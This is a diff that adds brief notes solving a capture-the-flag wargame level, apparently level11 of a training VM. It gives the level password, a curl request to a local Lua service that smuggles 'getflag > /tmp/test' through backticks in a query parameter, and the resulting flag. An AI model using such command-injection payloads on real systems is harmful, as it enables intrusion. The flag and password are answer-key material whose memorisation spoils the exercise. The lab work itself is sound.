@@ -1,0 +1,9 @@
+level11 : feulo4b72j7edeahuete3no7c
+Process :
+    - cat level11.lua
+    - nc 127.0.0.1 5151 
+    - Launch `sleep 5`
+    - `echo "test" > /tmp/test` or curl 'http://127.0.0.1:5151/?l=`getflag > /tmp/test`'
+    - cat /tmp/test
+    - `getflag > /tmp/test`
+    - cat /tmp/test get the flag = fa6v5ateaw21peobuub8ipe6s
